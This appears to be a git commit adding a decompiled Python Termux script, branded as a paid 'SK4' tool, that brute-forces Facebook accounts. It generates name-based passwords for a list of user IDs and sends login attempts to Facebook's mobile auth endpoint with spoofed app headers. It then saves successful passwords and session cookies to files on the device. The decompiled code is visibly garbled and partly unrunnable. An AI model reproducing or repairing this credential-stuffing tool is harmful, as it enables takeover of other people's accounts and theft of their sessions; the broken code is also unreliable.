84858a9f29514b3e18ca0292cad017e0329814d8
MRSH4MUL <mrsh4mul404@gmail.com>
2024-11-18 21:39:44 +0600

    Add files via upload

---
+++ Lover_dec1.py
@@ -0,0 +1,375 @@
+#DECODE BY MRSH4MUL
+#VARSON : 3.12
+#==========================#
+import os
+import base64
+import zlib
+import pip
+import urllib
+import platform
+import math
+import shutil
+import random
+import uuid
+import string
+import hashlib
+import json
+import sys
+import uuid
+import getpass
+from os import system as osRUB
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system as cmd
+from time import localtime as lt
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import bs4
+import time
+import datetime
+os.system('clear')
+print('\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m]\x1b[38;5;46m LOADING MODULES ')
+import requests
+import concurrent.futures as concurrent
+loop = 0
+oks = []
+cps = []
+twf = []
+pcp = []
+id = []
+tokenku = []
+uid = []
+cid = []
+
+def is_https_active():
+    response = requests.get('https://www.google.com')
+    response.raise_for_status()
+    return True
+    if requests.exceptions.RequestException:
+        e = None
+        e = None
+        del e
+        return False
+        e = None
+        del e
+
+if is_https_active():
+    pass
+sys.exit(f'''{A}[{G}={A}]{G} DON\'T ON YOUR LOCAL-CANARY NEXT TIME{R} !! ''')
+dic = {
+    '1': 'JANUARY',
+    '2': 'FEBRUARY',
+    '3': 'MARCH',
+    '4': 'APRIL',
+    '5': 'MAY',
+    '6': 'JUNE',
+    '7': 'JULY',
+    '8': 'AUGUST',
+    '9': 'SEPTEMBER',
+    '10': 'OCTOBER',
+    '11': 'NOVEMBER',
+    '12': 'DECEMBER' }
+dic2 = {
+    '01': 'January',
+    '02': 'February',
+    '03': 'March',
+    '04': 'April',
+    '05': 'May',
+    '06': 'June',
+    '07': 'July',
+    '08': 'August',
+    '09': 'September',
+    '10': 'October',
+    '11': 'November',
+    '12': 'Devember' }
+tgl = datetime.datetime.now().day
+bln = dic[str(datetime.datetime.now().month)]
+thn = datetime.datetime.now().year
+date = str(tgl) + '\x1b[1;97m|\x1b[38;5;122m' + str(bln) + '\x1b[1;97m|\x1b[38;5;122m' + str(thn)
+sys.stdout.write('\x1b]2;<💚MR.XIDI💚>\x07')
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+
+def linex():
+    print(f'''{G}─────────────────────────────────────────────────────────''')
+
+
+def x1():
+    END = '[FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
+    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';' + END
+    return ua
+
+A = '\x1b[1;97m'
+R = '\x1b[38;5;196m'
+Y = '\x1b[1;33m'
+G = '\x1b[38;5;46m'
+B = '\x1b[38;5;46m'
+G1 = '\x1b[38;5;48m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\x1b[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
+os.system('rm -rf /sdcard/.txt')
+os.system('clear')
+open('/sdcard/.txt', 'w').write(' ')
+
+def key():
+    clear()
+    print(f'''{A}[{G}={A}]{G} DO YOU WANT TO BUY A KEY''')
+    print(f'''{A}[{G}={A}]{G} MUST BUY FROM ADMIN ONLY''')
+    print(f'''{A}[{G}={A}]{G} WILL NOT BUY FROM ANYONE OTHER THAN ADMIN''')
+    input(f'''{A}[{G}={A}]{G} PRESS ENTER TO BUY KEY''')
+    os.system('xdg-open https://www.facebook.com/mrxiditool')
+
+logo = []['\n            '][f'''{A}'''][' .d8888b.  888    d8P     d8888  \n      '][f'''{A}''']['      d88P  Y88b 888   d8P     d8P888  \n         '][f'''{A}''']['   Y88b.      888  d8P     d8P 888  \n        '][f'''{G}''']['     "Y888b.   888d88K     d8P  888  \n          '][f'''{G}''']['      "Y88b. 8888888b   d88   888  \n       '][f'''{A}''']['           "888 888  Y88b  8888888888 \n    '][f'''{A}''']['        Y88b  d88P 888   Y88b       888  \n    '][f'''{A}''']['         "Y8888P"  888    Y88b      888     '][f'''{R}''']['TRICK \n'][f'''{G}''']['─────────────────────────────────────────────────────────\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' DEVELOPER     '][f'''{A}''']['>>'][f'''{G}''']['  MR OGGY\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' GITHUB       '][f'''{A}'''][' >>'][f'''{G}''']['  SKBER-CYBER\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' TOOL TYPE     '][f'''{A}''']['>>'][f'''{R}''']['  PREMIUM\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' VERSION       '][f'''{A}''']['>>'][f'''{G}''']['  0.1 \n'][f'''{G}''']([]['\n            '][f'''{A}'''][' .d8888b.  888    d8P     d8888  \n      '][f'''{A}''']['      d88P  Y88b 888   d8P     d8P888  \n         '][f'''{A}''']['   Y88b.      888  d8P     d8P 888  \n        '][f'''{G}''']['     "Y888b.   888d88K     d8P  888  \n          '][f'''{G}''']['      "Y88b. 8888888b   d88   888  \n       '][f'''{A}''']['           "888 888  Y88b  8888888888 \n    '][f'''{A}''']['        Y88b  d88P 888   Y88b       888  \n    '][f'''{A}''']['         "Y8888P"  888    Y88b      888     '][f'''{R}''']['TRICK \n'][f'''{G}''']['─────────────────────────────────────────────────────────\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' DEVELOPER     '][f'''{A}''']['>>'][f'''{G}''']['  MR OGGY\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' GITHUB       '][f'''{A}'''][' >>'][f'''{G}''']['  SKBER-CYBER\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' TOOL TYPE     '][f'''{A}''']['>>'][f'''{R}''']['  PREMIUM\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' VERSION       '][f'''{A}''']['>>'][f'''{G}''']['  0.1 \n'][f'''{G}''']['─────────────────────────────────────────────────────────'])
+import getpass
+attemps = 0
+if attemps < 0x2DFDC184L:
+    clear()
+    os.system('xdg-open https://youtube.com/@sk4trick?si=jC_4qMwuKyhWKfGh')
+    username = input(f'''{A}[{G}={A}]{G} PAID KEY {A}>>{G} ''')
+    if username == 'KHYTBKOAONUTBKLABU':
+        os.system('xdg-open https://youtube.com/@sk4trick?si=jC_4qMwuKyhWKfGh')
+        print(f'''{A}[{G}={A}]{G} PLACE W8''')
+        time.sleep(8)
+        print(f'''{A}[{G}={A}]{G} KEY CHECKING''')
+        time.sleep(8)
+        print(f'''{A}[{G}={A}]{G} DONE INJOY SK4 PAID TOOl''')
+        time.sleep(8)
+    os.system('xdg-open https://www.facebook.com/mrxiditool')
+    print(f'''{A}[{G}={A}]{G} PLACE W8''')
+    time.sleep(8)
+    print(f'''{A}[{G}={A}]{G} KEY CHECKING''')
+    time.sleep(8)
+    print(f'''{A}[{G}={A}]{G} ERROR KEY TRY AGAIN''')
+    time.sleep(8)
+    key()
+    attemps += 1
+os.system('clear')
+
+def Main():
+    clear()
+    os.system('xdg-open https://youtube.com/@sk4trick?si=jC_4qMwuKyhWKfGh')
+    print(f'''{A}[{G}1{A}]{G} FILE CRACK''')
+    print(f'''{A}[{G}2{A}]{G} RANDOM CRACK''')
+    print(f'''{A}[{G}3{A}]{G} JOINT PUBLIC GROUP''')
+    print(f'''{A}[{G}3{A}]{G} EXIT''')
+    linex()
+    sk4 = input(f'''{A}[{G}={A}]{G} CHOICE {A} >>{G} ''')
+    if sk4 in ('1', '01'):
+        file()
+        return None
+
+
+def file():
+    clear()
+    file = input(f'''{A}[{G}={A}]{G} FILE NAME {A} >>{G} ''')
+    fo = open(file, 'r').read().splitlines()
+    clear()
+    print(f'''{A}[{G}1{A}]{G} METHOD 1''')
+    print(f'''{A}[{G}2{A}]{G} METHOD 2''')
+    linex()
+    mthd = input(f'''{A}[{G}={A}]{G} CHOICE {A} >>{G} ''')
+    clear()
+    plist = []
+    print(f'''{A}[{G}1{A}]{G} AUTO PASSWORD CLONE''')
+    print(f'''{A}[{G}2{A}]{G} CHOICE PASSWORD CLONE''')
+    linex()
+    ppp = input(f'''{A}[{G}={A}]{G} CHOICE {A} >>{G} ''')
+    if ppp in ('1', '01'):
+        plist.append('first last')
+        plist.append('firstlast')
+        plist.append('first123')
+        plist.append('first12')
+        plist.append('first1')
+        plist.append('first1234')
+        plist.append('first12345')
+        plist.append('first112233')
+        plist.append('@123456@')
+        plist.append('first017')
+        plist.append('first018')
+        plist.append('first019')
+        plist.append('last123')
+        plist.append('firstlast123')
+        plist.append('first@123')
+        plist.append('first@1234')
+        plist.append('57575757')
+        plist.append('57575727')
+        plist.append('57273200')
+        plist.append('708090')
+        plist.append('@12345@')
+        plist.append('@1234567@')
+    clear()
+    ps_limit = int(input(f'''{A}[{G}={A}]{G} PASSWORD LIMIT {A} >>{G} '''))
+    clear()
+    print(f'''{A}[{G}={A}]{G} EXAMPLE {A} >>{G}  firstlast/first@@/first123 ''')
+    linex()
+    for i in range(ps_limit):
+        plist.append(input(f'''{A}[{G}={A}]{G} PASSWORD NO {i + 1} {A} >>{G} '''))
+        clear()
+        print(f'''{A}[{G}={A}]{G} DO YOU CP SHOW ACCOUNT (Y/N) ''')
+        linex()
+        cx = input(f'''{A}[{G}={A}]{G} CHOICE {A} >>{G} ''')
+        if cx in ('y', 'Y', 'yes', 'Yes', '1'):
+            pcp.append('y')
+    pcp.append('n')
+    crack_submit = tred(max_workers = 30)
+    clear()
+    total_ids = str(None(len))
+    print(f'''{A}[{G}={A}]{G} TOTAL ID  {A} >>{G} {total_ids}''')
+    print(f'''{A}[{G}={A}]{G} METHOD    {A} >>{G} M{mthd}''')
+    print(f'''{A}[{G}={A}]{G} METHOD    {A} >>{G} IF NO RESULT ON/OF AIRPLAN MODE''')
+    linex()
+    for user in fo:
+        (ids, names) = user.split('|')
+        passlist = plist
+        if mthd in ('1', '01'):
+            crack_submit.submit(api1, ids, names, passlist)
+        if not mthd in ('2', '02'):
+            pass
+        crack_submit.submit(api2, ids, names, passlist)
+        None(None, None)
+        return None
+        if FileNotFoundError:
+            print(f'''{A}[{G}={A}]{G} FILE LOCATION NOT FOUND ''')
+            time.sleep(1)
+            Main()
+    ps_limit = 1
+    if not None:
+        pass
+
+
+def api1(ids, names, passlist):
+    global loop
+    sys.stdout.write(f'''\r\r\r{A}[{G}SK4-M1{A}]{G}{A} >>{G}{A}[{G}{loop}{A}]{A} >>{G}{A}[{G}OK{A}>>{G}{len(oks)}{A}]''')
+    sys.stdout.flush()
+    sys.stdout.flush()
+    fn = names.split(' ')[0]
+    ln = names.split(' ')[1]
+    for pw in passlist:
+        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
+        data = {
+            'method': 'auth.login',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d' }
+        head = {
+            'User-Agent': x1(),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
+        url = 'https://b-graph.facebook.com/auth/login'
+        po = requests.post(url, data = data, headers = head, allow_redirects = False, verify = True).json()
+        if 'access_token' in po:
+            coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(po['session_cookies']())
+            print(f'''\r\r{A}[{G}SK4-OK{A}]{G} ''' + ids + ' | ' + pas + '')
+            open('/sdcard/SK4-FILE-M1-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+            oks.append(ids)
+            ';'.join
+        if 'www.facebook.com' in po['error']['message']:
+            open('/sdcard/SK4-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
+            cps.append(ids)
+    loop += 1
+    return None
+    'GB'
+    ln = fn
+    if Exception:
+        e = 'client_country_code'
+        e = None
+        del e
+        return None
+        e = None
+        del e
+
+
+def api2(ids, names, passlist):
+    global loop
+    sys.stdout.write(f'''\r\r\r{A}[{G}SK4-M2{A}]{G}{A} >>{G}{A}[{G}{loop}{A}]{A} >>{G}{A}[{G}OK{A}>>{G}{len(oks)}{A}]''')
+    sys.stdout.flush()
+    sys.stdout.flush()
+    fn = names.split(' ')[0]
+    ln = names.split(' ')[1]
+    for pw in passlist:
+        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
+        data = {
+            'method': 'auth.login',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d' }
+        head = {
+            'User-Agent': x1(),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
+        url = 'https://b-graph.facebook.com/auth/login'
+        po = requests.post(url, data = data, headers = head, allow_redirects = False, verify = True).json()
+        if 'access_token' in po:
+            coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(po['session_cookies']())
+            print(f'''\r\r{A}[{G}SK4-OK{A}]{G} ''' + ids + ' | ' + pas + '')
+            open('/sdcard/SK4-FILE-M2-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+            oks.append(ids)
+            ';'.join
+        if 'www.facebook.com' in po['error']['message']:
+            open('/sdcard/SK4-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
+            cps.append(ids)
+    loop += 1
+    return None
+    'GB'
+    ln = fn
+    if Exception:
+        e = 'client_country_code'
+        e = None
+        del e
+        return None
+        e = None
+        del e
+
+Main()
+return None
+if ImportError:
+    []['\n            '][f'''{A}'''][' .d8888b.  888    d8P     d8888  \n      '][f'''{A}''']['      d88P  Y88b 888   d8P     d8P888  \n         '][f'''{A}''']['   Y88b.      888  d8P     d8P 888  \n        '][f'''{G}''']['     "Y888b.   888d88K     d8P  888  \n          '][f'''{G}''']['      "Y88b. 8888888b   d88   888  \n       '][f'''{A}''']['           "888 888  Y88b  8888888888 \n    '][f'''{A}''']['        Y88b  d88P 888   Y88b       888  \n    '][f'''{A}''']['         "Y8888P"  888    Y88b      888     '][f'''{R}''']['TRICK \n'][f'''{G}''']['─────────────────────────────────────────────────────────\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' DEVELOPER     '][f'''{A}''']['>>'][f'''{G}''']['  MR OGGY\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' GITHUB       '][f'''{A}'''][' >>'][f'''{G}''']['  SKBER-CYBER\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' TOOL TYPE     '][f'''{A}''']['>>'][f'''{R}''']['  PREMIUM\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' VERSION       '][f'''{A}''']['>>'][f'''{G}''']['  0.1 \n']
+    print('\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m]\x1b[38;5;46m INSTALLING REQUESTS ')
+    os.system('pip install requests')
+if ImportError:
+    []['\n            '][f'''{A}'''][' .d8888b.  888    d8P     d8888  \n      '][f'''{A}''']['      d88P  Y88b 888   d8P     d8P888  \n         '][f'''{A}''']['   Y88b.      888  d8P     d8P 888  \n        '][f'''{G}''']['     "Y888b.   888d88K     d8P  888  \n          '][f'''{G}''']['      "Y88b. 8888888b   d88   888  \n       '][f'''{A}''']['           "888 888  Y88b  8888888888 \n    '][f'''{A}''']['        Y88b  d88P 888   Y88b       888  \n    '][f'''{A}''']['         "Y8888P"  888    Y88b      888     '][f'''{R}''']['TRICK \n'][f'''{G}''']['─────────────────────────────────────────────────────────\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' DEVELOPER     '][f'''{A}''']['>>'][f'''{G}''']['  MR OGGY\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' GITHUB       '][f'''{A}'''][' >>'][f'''{G}''']['  SKBER-CYBER\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' TOOL TYPE     '][f'''{A}''']['>>'][f'''{R}''']['  PREMIUM\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' VERSION       '][f'''{A}''']['>>'][f'''{G}''']
+    print('\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m]\x1b[38;5;46m INSTALLING FUTURES ')
+    os.system('pip install futures')
+if PermissionError:
+    []['\n            '][f'''{A}'''][' .d8888b.  888    d8P     d8888  \n      '][f'''{A}''']['      d88P  Y88b 888   d8P     d8P888  \n         '][f'''{A}''']['   Y88b.      888  d8P     d8P 888  \n        '][f'''{G}''']['     "Y888b.   888d88K     d8P  888  \n          '][f'''{G}''']['      "Y88b. 8888888b   d88   888  \n       '][f'''{A}''']['           "888 888  Y88b  8888888888 \n    '][f'''{A}''']['        Y88b  d88P 888   Y88b       888  \n    '][f'''{A}''']['         "Y8888P"  888    Y88b      888     '][f'''{R}''']['TRICK \n'][f'''{G}''']['─────────────────────────────────────────────────────────\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' DEVELOPER     '][f'''{A}''']['>>'][f'''{G}''']['  MR OGGY\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' GITHUB       '][f'''{A}'''][' >>'][f'''{G}''']['  SKBER-CYBER\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' TOOL TYPE     '][f'''{A}''']['>>'][f'''{R}''']['  PREMIUM\n'][f'''{A}''']['['][f'''{G}''']['='][f'''{A}'''][']'][f'''{G}'''][' VERSION       '][f'''{A}''']['>>']
+    print(f'''{A}[{G}={A}]{G} WITHOUT PERMITION YOU CAN''' + 'T RUN THE TOOL')
+    os.system('termux-setup-storage')
+    os.system('clear')
+    exit(f'''{A}[{G}={A}]{G} RU''' + 'N AGA' + 'IN TH' + 'IS TO' + 'OLS...{R}! ')
